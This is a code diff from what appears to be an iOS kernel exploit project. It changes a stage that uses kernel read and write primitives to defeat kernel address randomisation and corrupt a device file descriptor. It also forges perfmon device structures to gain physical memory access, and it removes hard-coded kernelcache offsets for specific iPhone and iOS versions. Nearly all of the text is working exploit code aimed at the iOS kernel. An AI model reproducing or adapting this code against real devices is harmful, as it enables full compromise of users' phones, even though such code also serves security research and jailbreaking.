@@ -9,75 +9,6 @@
 u64 phystokv(struct kfd* kfd, u64 pa);
 u64 vtophys(struct kfd* kfd, u64 va);
 
-struct kernelcache_addresses {
-    u64 kernel_base;
-    u64 vn_kqfilter;                     // "Invalid knote filter on a vnode!"
-    u64 ptov_table;                      // "%s: illegal PA: 0x%llx; phys base 0x%llx, size 0x%llx"
-    u64 gVirtBase;                       // "%s: illegal PA: 0x%llx; phys base 0x%llx, size 0x%llx"
-    u64 gPhysBase;                       // "%s: illegal PA: 0x%llx; phys base 0x%llx, size 0x%llx"
-    u64 gPhysSize;                       // (gPhysBase + 0x8)
-    u64 perfmon_devices;                 // "perfmon: %s: devfs_make_node_clone failed"
-    u64 perfmon_dev_open;                // "perfmon: attempt to open unsupported source: 0x%x"
-    u64 cdevsw;                          // "Can't mark ptc as kqueue ok"
-    u64 vm_pages;                        // "pmap_startup(): too many pages to support vm_page packing"
-    u64 vm_page_array_beginning_addr;    // "pmap_startup(): too many pages to support vm_page packing"
-    u64 vm_page_array_ending_addr;       // "pmap_startup(): too many pages to support vm_page packing"
-    u64 vm_first_phys_ppnum;             // "pmap_startup(): too many pages to support vm_page packing"
-};
-
-const struct kernelcache_addresses kcs[] = {
-    // An index of zero means that the version is unsupported.
-    {},
-    // From the iOS 16.4 kernelcache for the iPhone 14 Pro Max.
-    {
-        .kernel_base = 0xfffffff007004000,
-        .vn_kqfilter = 0xfffffff007f3960c,
-        .ptov_table = 0xfffffff0078e7178,
-        .gVirtBase = 0xfffffff0079320a8,
-        .gPhysBase = 0xfffffff007933ed0,
-        .gPhysSize = 0xfffffff007933ed8,
-        .perfmon_devices = 0xfffffff00a44f500,
-        .perfmon_dev_open = 0xfffffff007eecd3c,
-        .cdevsw = 0xfffffff00a411208,
-        .vm_pages = 0xfffffff0078e3eb8,
-        .vm_page_array_beginning_addr = 0xfffffff0078e6128,
-        .vm_page_array_ending_addr = 0xfffffff00a44e988,
-        .vm_first_phys_ppnum = 0xfffffff00a44e990,
-    },
-    // From the iOS 16.5 kernelcache for the iPhone 14 Pro Max.
-    {
-        .kernel_base = 0xfffffff007004000,
-        .vn_kqfilter = 0xfffffff007f39b28,
-        .ptov_table = 0xfffffff0078e7178,
-        .gVirtBase = 0xfffffff0079321e8,
-        .gPhysBase = 0xfffffff007934010,
-        .gPhysSize = 0xfffffff007934018,
-        .perfmon_devices = 0xfffffff00a457500,
-        .perfmon_dev_open = 0xfffffff007eecfc0,
-        .cdevsw = 0xfffffff00a419208,
-        .vm_pages = 0xfffffff0078e3eb8,
-        .vm_page_array_beginning_addr = 0xfffffff0078e6128,
-        .vm_page_array_ending_addr = 0xfffffff00a456988,
-        .vm_first_phys_ppnum = 0xfffffff00a456990,
-    },
-    // From the iOS 16.5.1 kernelcache for the iPhone 14 Pro Max.
-    {
-        .kernel_base = 0xfffffff007004000,
-        .vn_kqfilter = 0xfffffff007f39c18,
-        .ptov_table = 0xfffffff0078e7178,
-        .gVirtBase = 0xfffffff007932288,
-        .gPhysBase = 0xfffffff0079340b0,
-        .gPhysSize = 0xfffffff0079340b8,
-        .perfmon_devices = 0xfffffff00a457500,
-        .perfmon_dev_open = 0xfffffff007eed0b0,
-        .cdevsw = 0xfffffff00a419208,
-        .vm_pages = 0xfffffff0078e3eb8,
-        .vm_page_array_beginning_addr = 0xfffffff0078e6128,
-        .vm_page_array_ending_addr = 0xfffffff00a456988,
-        .vm_first_phys_ppnum = 0xfffffff00a456990,
-    }
-};
-
 void perf_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
 {
     assert((size != 0) && (size <= UINT16_MAX));
@@ -135,36 +66,6 @@ void perf_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
 
 void perf_init(struct kfd* kfd)
 {
-    char hw_model[16] = {};
-    usize size = sizeof(hw_model);
-    assert_bsd(sysctlbyname("hw.model", hw_model, &size, NULL, 0));
-    print_string(hw_model);
-
-    const char iphone_14_pro_max[] = "D74AP";
-    if (memcmp(hw_model, iphone_14_pro_max, sizeof(iphone_14_pro_max))) {
-        kfd->perf.kernelcache_index = 0;
-        return;
-    }
-
-    switch (*(u64*)(&kfd->info.env.osversion)) {
-        case ios_16_4: {
-            kfd->perf.kernelcache_index = 1;
-            break;
-        }
-        case ios_16_5: {
-            kfd->perf.kernelcache_index = 2;
-            break;
-        }
-        case ios_16_5_1: {
-            kfd->perf.kernelcache_index = 3;
-            break;
-        }
-        default: {
-            kfd->perf.kernelcache_index = 0;
-            return;
-        }
-    }
-
     /*
      * Allocate a page that will be used as a shared buffer between user space and kernel space.
      */
@@ -174,83 +75,50 @@ void perf_init(struct kfd* kfd)
     memset((void*)(shared_page_address), 0, shared_page_size);
     kfd->perf.shared_page.uaddr = shared_page_address;
     kfd->perf.shared_page.size = shared_page_size;
-}
-
-void perf_run(struct kfd* kfd)
-{
-    if (!kfd->perf.kernelcache_index) {
-        return;
-    }
-
-    const struct kernelcache_addresses* kc = &kcs[kfd->perf.kernelcache_index];
 
     /*
      * Open a "/dev/aes_0" descriptor, then use it to find the kernel slide.
      */
     kfd->perf.dev.fd = open("/dev/aes_0", O_RDWR);
     assert(kfd->perf.dev.fd > 0);
+}
 
+void perf_run(struct kfd* kfd)
+{
     assert(kfd->info.kaddr.current_proc);
-    u64 fd_ofiles_kaddr = kfd->info.kaddr.current_proc + dynamic_offsetof(proc, p_fd_fd_ofiles);
-    u64 fd_ofiles = 0;
-    kread((u64)(kfd), fd_ofiles_kaddr, &fd_ofiles, sizeof(fd_ofiles));
-
+    u64 fd_ofiles = kget_u64(proc__p_fd__fd_ofiles, kfd->info.kaddr.current_proc);
     u64 fileproc_kaddr = unsign_kaddr(fd_ofiles) + (kfd->perf.dev.fd * sizeof(u64));
     u64 fileproc = 0;
     kread((u64)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));
-
-    u64 fp_glob_kaddr = fileproc + static_offsetof(fileproc, fp_glob);
+    u64 fp_glob_kaddr = fileproc + offsetof(struct fileproc, fp_glob);
     u64 fp_glob = 0;
     kread((u64)(kfd), fp_glob_kaddr, &fp_glob, sizeof(fp_glob));
-
-    u64 fg_ops_kaddr = unsign_kaddr(fp_glob) + static_offsetof(fileglob, fg_ops);
-    u64 fg_ops = 0;
-    kread((u64)(kfd), fg_ops_kaddr, &fg_ops, sizeof(fg_ops));
-
-    u64 fo_kqfilter_kaddr = unsign_kaddr(fg_ops) + static_offsetof(fileops, fo_kqfilter);
-    u64 fo_kqfilter = 0;
-    kread((u64)(kfd), fo_kqfilter_kaddr, &fo_kqfilter, sizeof(fo_kqfilter));
-
+    u64 fg_ops = kget_u64(fileglob__fg_ops, unsign_kaddr(fp_glob));
+    u64 fo_kqfilter =  kget_u64(fileops__fo_kqfilter, unsign_kaddr(fg_ops));
     u64 vn_kqfilter = unsign_kaddr(fo_kqfilter);
-    u64 kernel_slide = vn_kqfilter - kc->vn_kqfilter;
-    u64 kernel_base = kc->kernel_base + kernel_slide;
+    u64 kernel_slide = vn_kqfilter - kfd_offset(kernelcache__vn_kqfilter);
+    u64 kernel_base = kfd_offset(kernelcache__kernel_base) + kernel_slide;
     kfd->perf.kernel_slide = kernel_slide;
     print_x64(kfd->perf.kernel_slide);
 
-    u32 mh_header[2] = {};
-    mh_header[0] = kread_sem_open_kread_u32(kfd, kernel_base);
-    mh_header[1] = kread_sem_open_kread_u32(kfd, kernel_base + 4);
-    assert(mh_header[0] == 0xfeedfacf);
-    assert(mh_header[1] == 0x0100000c);
-
-    /*
-     * Set up some globals used by vm_page.h.
-     */
-    u64 vm_pages_kaddr = kc->vm_pages + kernel_slide;
-    u64 vm_page_array_beginning_addr_kaddr = kc->vm_page_array_beginning_addr + kernel_slide;
-    u64 vm_page_array_ending_addr_kaddr = kc->vm_page_array_ending_addr + kernel_slide;
-    u64 vm_first_phys_ppnum_kaddr = kc->vm_first_phys_ppnum + kernel_slide;
-    kread((u64)(kfd), vm_pages_kaddr, &vm_pages, sizeof(vm_pages));
-    kread((u64)(kfd), vm_page_array_beginning_addr_kaddr, &vm_page_array_beginning_addr, sizeof(vm_page_array_beginning_addr));
-    kread((u64)(kfd), vm_page_array_ending_addr_kaddr, &vm_page_array_ending_addr, sizeof(vm_page_array_ending_addr));
-    vm_first_phys_ppnum = kread_sem_open_kread_u32(kfd, vm_first_phys_ppnum_kaddr);
+    if (kfd->kread.krkw_method_ops.kread == kread_sem_open_kread) {
+        u32 mh_header[2] = {};
+        mh_header[0] = kread_sem_open_kread_u32(kfd, kernel_base);
+        mh_header[1] = kread_sem_open_kread_u32(kfd, kernel_base + 4);
+        assert(mh_header[0] == 0xfeedfacf);
+        assert(mh_header[1] == 0x0100000c);
+    }
 
     /*
      * Corrupt the "/dev/aes_0" descriptor into a "/dev/perfmon_core" descriptor.
      */
-    u64 fg_data_kaddr = unsign_kaddr(fp_glob) + static_offsetof(fileglob, fg_data);
-    u64 fg_data = 0;
-    kread((u64)(kfd), fg_data_kaddr, &fg_data, sizeof(fg_data));
-
-    u64 v_specinfo_kaddr = unsign_kaddr(fg_data) + 0x0078; // offsetof(struct vnode, v_specinfo)
-    u64 v_specinfo = 0;
-    kread((u64)(kfd), v_specinfo_kaddr, &v_specinfo, sizeof(v_specinfo));
-
-    kfd->perf.dev.si_rdev_kaddr = unsign_kaddr(v_specinfo) + 0x0018; // offsetof(struct specinfo, si_rdev)
+    u64 fg_data = kget_u64(fileglob__fg_data, unsign_kaddr(fp_glob));
+    u64 v_specinfo = kget_u64(vnode__v_un__vu_specinfo, unsign_kaddr(fg_data));
+    kfd->perf.dev.si_rdev_kaddr = unsign_kaddr(v_specinfo) + kfd_offset(specinfo__si_rdev);
     kread((u64)(kfd), kfd->perf.dev.si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));
 
-    u64 cdevsw_kaddr = kc->cdevsw + kernel_slide;
-    u64 perfmon_dev_open_kaddr = kc->perfmon_dev_open + kernel_slide;
+    u64 cdevsw_kaddr = kfd_offset(kernelcache__cdevsw) + kernel_slide;
+    u64 perfmon_dev_open_kaddr = kfd_offset(kernelcache__perfmon_dev_open) + kernel_slide;
     u64 cdevsw[14] = {};
     u32 dev_new_major = 0;
     for (u64 dmaj = 0; dmaj < 64; dmaj++) {
@@ -263,8 +131,6 @@ void perf_run(struct kfd* kfd)
         }
     }
 
-    assert(dev_new_major == 0x11000000);
-
     u32 new_si_rdev_buffer[2] = {};
     new_si_rdev_buffer[0] = dev_new_major;
     new_si_rdev_buffer[1] = kfd->perf.dev.si_rdev_buffer[1] + 1;
@@ -273,33 +139,29 @@ void perf_run(struct kfd* kfd)
     /*
      * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
      */
-    u64 ptov_table_kaddr = kc->ptov_table + kernel_slide;
+    u64 ptov_table_kaddr = kfd_offset(kernelcache__ptov_table) + kernel_slide;
     kread((u64)(kfd), ptov_table_kaddr, &kfd->perf.ptov_table, sizeof(kfd->perf.ptov_table));
 
-    u64 gVirtBase_kaddr = kc->gVirtBase + kernel_slide;
+    u64 gVirtBase_kaddr = kfd_offset(kernelcache__gVirtBase) + kernel_slide;
     kread((u64)(kfd), gVirtBase_kaddr, &kfd->perf.gVirtBase, sizeof(kfd->perf.gVirtBase));
     print_x64(kfd->perf.gVirtBase);
 
-    u64 gPhysBase_kaddr = kc->gPhysBase + kernel_slide;
+    u64 gPhysBase_kaddr = kfd_offset(kernelcache__gPhysBase) + kernel_slide;
     kread((u64)(kfd), gPhysBase_kaddr, &kfd->perf.gPhysBase, sizeof(kfd->perf.gPhysBase));
     print_x64(kfd->perf.gPhysBase);
 
-    u64 gPhysSize_kaddr = kc->gPhysSize + kernel_slide;
+    u64 gPhysSize_kaddr = kfd_offset(kernelcache__gPhysSize) + kernel_slide;
     kread((u64)(kfd), gPhysSize_kaddr, &kfd->perf.gPhysSize, sizeof(kfd->perf.gPhysSize));
     print_x64(kfd->perf.gPhysSize);
 
     assert(kfd->info.kaddr.current_pmap);
-    u64 ttbr0_va_kaddr = kfd->info.kaddr.current_pmap + static_offsetof(pmap, tte);
-    u64 ttbr0_pa_kaddr = kfd->info.kaddr.current_pmap + static_offsetof(pmap, ttep);
-    kread((u64)(kfd), ttbr0_va_kaddr, &kfd->perf.ttbr[0].va, sizeof(kfd->perf.ttbr[0].va));
-    kread((u64)(kfd), ttbr0_pa_kaddr, &kfd->perf.ttbr[0].pa, sizeof(kfd->perf.ttbr[0].pa));
+    kfd->perf.ttbr[0].va = kget_u64(pmap__tte, kfd->info.kaddr.current_pmap);
+    kfd->perf.ttbr[0].pa = kget_u64(pmap__ttep, kfd->info.kaddr.current_pmap);
     assert(phystokv(kfd, kfd->perf.ttbr[0].pa) == kfd->perf.ttbr[0].va);
 
     assert(kfd->info.kaddr.kernel_pmap);
-    u64 ttbr1_va_kaddr = kfd->info.kaddr.kernel_pmap + static_offsetof(pmap, tte);
-    u64 ttbr1_pa_kaddr = kfd->info.kaddr.kernel_pmap + static_offsetof(pmap, ttep);
-    kread((u64)(kfd), ttbr1_va_kaddr, &kfd->perf.ttbr[1].va, sizeof(kfd->perf.ttbr[1].va));
-    kread((u64)(kfd), ttbr1_pa_kaddr, &kfd->perf.ttbr[1].pa, sizeof(kfd->perf.ttbr[1].pa));
+    kfd->perf.ttbr[1].va = kget_u64(pmap__tte, kfd->info.kaddr.kernel_pmap);
+    kfd->perf.ttbr[1].pa = kget_u64(pmap__ttep, kfd->info.kaddr.kernel_pmap);
     assert(phystokv(kfd, kfd->perf.ttbr[1].pa) == kfd->perf.ttbr[1].va);
 
     /*
@@ -314,10 +176,9 @@ void perf_run(struct kfd* kfd)
      * - perfmon_devices[0][0].pmdv_allocated = true
      */
     struct perfmon_device perfmon_device = {};
-    u64 perfmon_device_kaddr = kc->perfmon_devices + kernel_slide;
+    u64 perfmon_device_kaddr = kfd_offset(kernelcache__perfmon_devices) + kernel_slide;
     u8* perfmon_device_uaddr = (u8*)(&perfmon_device);
     kread((u64)(kfd), perfmon_device_kaddr, &perfmon_device, sizeof(perfmon_device));
-    assert((perfmon_device.pmdv_mutex[0] & 0xffffff00ffffffff) == 0x0000000022000000);
 
     perfmon_device.pmdv_mutex[1] = (-1);
     perfmon_device.pmdv_config = (struct perfmon_config*)(kfd->perf.shared_page.kaddr);
@@ -339,10 +200,6 @@ void perf_run(struct kfd* kfd)
 
 void perf_free(struct kfd* kfd)
 {
-    if (!kfd->perf.kernelcache_index) {
-        return;
-    }
-
     kfd->kread.krkw_method_ops.kread = kfd->perf.saved_kread;
     kfd->kwrite.krkw_method_ops.kwrite = kfd->perf.saved_kwrite;
 
@@ -352,7 +209,6 @@ void perf_free(struct kfd* kfd)
      * This leaves the first perfmon device "pmdv_allocated", which is fine.
      */
     kwrite((u64)(kfd), &kfd->perf.dev.si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(kfd->perf.dev.si_rdev_buffer));
-
     assert_bsd(close(kfd->perf.dev.fd));
     assert_mach(vm_deallocate(mach_task_self(), kfd->perf.shared_page.uaddr, kfd->perf.shared_page.size));
 }
